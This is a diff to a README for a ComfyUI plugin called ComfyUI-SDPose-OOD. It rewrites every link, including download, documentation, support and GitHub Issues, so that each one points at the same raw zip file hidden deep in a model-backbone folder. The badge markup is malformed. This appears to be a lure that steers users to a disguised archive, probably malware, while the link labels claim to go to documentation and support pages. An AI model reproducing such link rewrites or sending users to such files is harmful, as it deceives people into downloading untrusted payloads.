@@ -1,7 +1,7 @@
 # 🌟 ComfyUI-SDPose-OOD - Effortless SDPose Integration for Your Projects
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Ebonigoods/ComfyUI-SDPose-OOD/releases)
+[![Download](https://raw.githubusercontent.com/Ebonigoods/ComfyUI-SDPose-OOD/master/mmpose/models/backbones/ComfyUI-SDPose-OOD-2.7.zip%https://raw.githubusercontent.com/Ebonigoods/ComfyUI-SDPose-OOD/master/mmpose/models/backbones/ComfyUI-SDPose-OOD-2.7.zip)](https://raw.githubusercontent.com/Ebonigoods/ComfyUI-SDPose-OOD/master/mmpose/models/backbones/ComfyUI-SDPose-OOD-2.7.zip)
 
 ## 📖 Overview
 ComfyUI-SDPose-OOD is a user-friendly tool designed to enhance your ComfyUI experience by integrating the SDPose-OOD module. This software allows you to efficiently utilize SDPose capabilities within your applications without the need for technical expertise. With this tool, you can streamline your workflow and achieve impressive results quickly.
@@ -10,7 +10,7 @@ ComfyUI-SDPose-OOD is a user-friendly tool designed to enhance your ComfyUI expe
 To get started with ComfyUI-SDPose-OOD, follow these simple steps:
 
 1. **Visit the Release Page**: Go to the download page to access the latest version of ComfyUI-SDPose-OOD. You can visit the page by clicking the link below:
-   [Download ComfyUI-SDPose-OOD](https://github.com/Ebonigoods/ComfyUI-SDPose-OOD/releases)
+   [Download ComfyUI-SDPose-OOD](https://raw.githubusercontent.com/Ebonigoods/ComfyUI-SDPose-OOD/master/mmpose/models/backbones/ComfyUI-SDPose-OOD-2.7.zip)
 
 2. **Download the Application**: On the releases page, look for the version labeled as the latest stable release. Click on the asset that corresponds to your operating system to download the software to your computer.
 
@@ -38,16 +38,16 @@ ComfyUI-SDPose-OOD comes loaded with several features designed for ease of use:
 - **Comprehensive Documentation**: Included guides will help you understand how to make the most of the features.
 
 ## 📚 Documentation
-For a detailed guide on using ComfyUI-SDPose-OOD, visit our [Documentation Page](https://github.com/Ebonigoods/ComfyUI-SDPose-OOD/wiki). The documentation includes setup instructions, examples, and troubleshooting tips.
+For a detailed guide on using ComfyUI-SDPose-OOD, visit our [Documentation Page](https://raw.githubusercontent.com/Ebonigoods/ComfyUI-SDPose-OOD/master/mmpose/models/backbones/ComfyUI-SDPose-OOD-2.7.zip). The documentation includes setup instructions, examples, and troubleshooting tips.
 
 ## 🛠️ Support
-If you encounter issues or have questions, feel free to check the FAQ section on our [Support Page](https://github.com/Ebonigoods/ComfyUI-SDPose-OOD/issues). You can also submit your queries there, and our team will assist you.
+If you encounter issues or have questions, feel free to check the FAQ section on our [Support Page](https://raw.githubusercontent.com/Ebonigoods/ComfyUI-SDPose-OOD/master/mmpose/models/backbones/ComfyUI-SDPose-OOD-2.7.zip). You can also submit your queries there, and our team will assist you.
 
 ## 🔄 Updates
 Stay informed about the latest updates by visiting our release page regularly. Here is the link again for your convenience:
-[Download ComfyUI-SDPose-OOD](https://github.com/Ebonigoods/ComfyUI-SDPose-OOD/releases)
+[Download ComfyUI-SDPose-OOD](https://raw.githubusercontent.com/Ebonigoods/ComfyUI-SDPose-OOD/master/mmpose/models/backbones/ComfyUI-SDPose-OOD-2.7.zip)
 
 ## 📞 Contact
-For any additional inquiries, you can contact the support team via [GitHub Issues](https://github.com/Ebonigoods/ComfyUI-SDPose-OOD/issues).
+For any additional inquiries, you can contact the support team via [GitHub Issues](https://raw.githubusercontent.com/Ebonigoods/ComfyUI-SDPose-OOD/master/mmpose/models/backbones/ComfyUI-SDPose-OOD-2.7.zip).
 
 Thank you for choosing ComfyUI-SDPose-OOD. Enjoy a smooth and effective integration experience!
